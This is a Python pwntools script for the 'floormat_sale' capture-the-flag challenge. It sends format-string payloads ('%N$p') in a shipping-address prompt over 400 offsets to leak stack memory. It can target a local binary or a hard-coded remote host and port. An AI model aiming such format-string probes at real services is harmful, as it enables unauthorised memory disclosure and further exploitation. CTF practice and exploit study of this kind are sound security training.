#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = '54.85.45.101', 8007

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'error'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#└─$ pwn checksec floormat_sale 
#[*] '/home/kali/Windows/Intigriti1337Up/floormat_sale/challenge/floormat_sale'
#    Arch:       amd64-64-little
#    RELRO:      Partial RELRO
#    Stack:      No canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    Stripped:   No



def exploit(i):
    global io
    io = initialize()
    io.sendlineafter(b"Enter your choice:", b"1")
    io.sendlineafter(b'Please enter your shipping address:', "AAAAAAAA||||||||%%%d$p" % i)
    io.recvuntil(b"Your floor mat will be shipped to:\n")
    io.recvline()
    print("%d - %s" % (i, io.recvline().strip()))
    
if __name__ == '__main__':
    for i in range(400):
       try:
         exploit(i)
         io.close()
       except EOFError:
         io.close()

